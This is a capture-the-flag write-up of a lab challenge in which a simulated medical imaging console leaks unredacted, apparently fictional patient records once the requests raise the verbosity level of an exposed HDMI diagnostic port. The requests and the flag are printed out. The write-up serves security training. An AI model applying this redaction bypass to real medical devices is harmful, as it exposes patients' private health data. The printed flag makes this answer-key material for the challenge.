# Second Opinion — Brain Scans (50 pts)

The touchscreen redacts the current patient to initials and a masked MRN. But the device has maintenance ports "not locked or concealed with a plate" — and the flag hint says "hdm1 leaks the whole patient".

## How I solved it

The Field Service Manual again (from the Asset Label hotspot): Section 3.1 says the HDMI output mirrors the console with an engineer diagnostic OSD, and it has **4 verbosity levels (0-3)** — level 3 is a "raw session dump" that disables field redaction.

Connect the tool from the toolkit:

```json
POST /api/connect {"tool":"hdmi","port":"hdmi"}
```

Then walk the display levels with the connect token:

```
GET /api/external-display?level=0   -> {"initials":"G.M.","maskedMrn":"****13"}
GET /api/external-display?level=2   -> session.redaction=ON  raw_dump=locked (needs level 3)
GET /api/external-display?level=3   -> raw:true
```

Level 3 dumps the whole session: **Gideon Marsh, DOB 1981-10-31, MRN 100413**, the study, the tech, the timestamp — and a `diagSession` field containing the flag.

So the patient on screen was only ever "redacted" by a verbosity setting on an unsecured physical port.

## Flag

```
deadface{hdm1_l34ks_th3_wh0l3_p4t13nt}
```
